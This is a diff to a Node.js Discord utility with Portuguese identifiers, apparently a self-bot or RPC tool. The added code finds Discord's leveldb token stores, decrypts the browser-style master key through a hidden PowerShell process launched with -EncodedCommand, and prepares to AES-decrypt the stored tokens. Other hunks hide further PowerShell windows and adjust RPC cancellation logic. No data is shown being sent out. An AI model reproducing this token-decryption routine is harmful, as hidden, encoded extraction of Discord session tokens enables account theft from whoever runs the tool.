@@ -64,7 +64,6 @@ if (!config.desativar_rpc) {
 }
 
 if (process.platform === "win32") {
-	const dpapi = require("node-dpapi-prebuilt");
 	const appData = process.env.APPDATA;
 
 	const PATHS_DISCORD = [
@@ -81,6 +80,37 @@ if (process.platform === "win32") {
 			path: path.join(appData, "discordptb", "Local Storage", "leveldb"),
 		},
 	];
+
+	const descriptografar_dpapi = (buffer) => {
+		const input = buffer.toString("base64");
+
+		const psScript = `
+	    	Add-Type -AssemblyName System.Security;
+	    	$encrypted = [Convert]::FromBase64String("${input}");
+	    	$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
+	    		$encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+	    	);
+	    	[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;
+	    	[System.Convert]::ToBase64String($decrypted);
+	    `;
+
+		const result = spawnSync(
+			"powershell.exe",
+			["-EncodedCommand", Buffer.from(psScript, "utf16le").toString("base64")],
+			{
+				encoding: "utf8",
+				windowsHide: true,
+			},
+		);
+
+		if (result.status !== 0 || result.error) return null;
+
+		try {
+			return Buffer.from(result.stdout.trim(), "base64");
+		} catch {
+			return null;
+		}
+	};
 
 	const descriptografarAES = (buffer, key) => {
 		try {
@@ -113,11 +143,8 @@ if (process.platform === "win32") {
 					localState.os_crypt.encrypted_key,
 					"base64",
 				).slice(5);
-				const decryptedKey = dpapi.unprotectData(
-					encryptedKey,
-					null,
-					"CurrentUser",
-				);
+
+				const decryptedKey = descriptografar_dpapi(encryptedKey);
 				const files = fs
 					.readdirSync(lvlPath)
 					.filter((f) => f.endsWith(".ldb") || f.endsWith(".log"));
@@ -1323,6 +1350,7 @@ async function clearPackage() {
 	if (process.platform === "win32") {
 		const child = spawnSync("powershell.exe", ["-Command", psScript], {
 			encoding: "utf8",
+			windowsHide: true,
 		});
 		const path = child.stdout.toString().trim();
 		if (!path) {
@@ -1524,6 +1552,7 @@ async function selecionarArquivoZip() {
 
 		const child = spawnSync("powershell.exe", ["-Command", psScript], {
 			encoding: "utf8",
+			windowsHide: true,
 		});
 		return child.stdout.toString().trim();
 	} else {
@@ -2637,7 +2666,6 @@ const readline = require("readline");
 async function definirRPC() {
 	return new Promise((resolve, reject) => {
 		const child = spawn(process.execPath, [require.resolve("definir-rpc")]);
-		let encerrado = false;
 
 		abrir_link("http://localhost");
 		console.clear();
@@ -2654,8 +2682,6 @@ async function definirRPC() {
 		});
 
 		rl.on("line", () => {
-			if (encerrado) return;
-			encerrado = true;
 			console.log(`${cor}[!]${reset} Cancelando definição do RPC...`);
 			child.kill();
 			rl.close();
@@ -2663,12 +2689,6 @@ async function definirRPC() {
 		});
 
 		child.on("exit", () => {
-			if (encerrado) return;
-			encerrado = true;
-			try {
-				process.stdin.setRawMode(false);
-				process.stdin.resume();
-			} catch {}
 			rl.close();
 			resolve("setado");
 		});
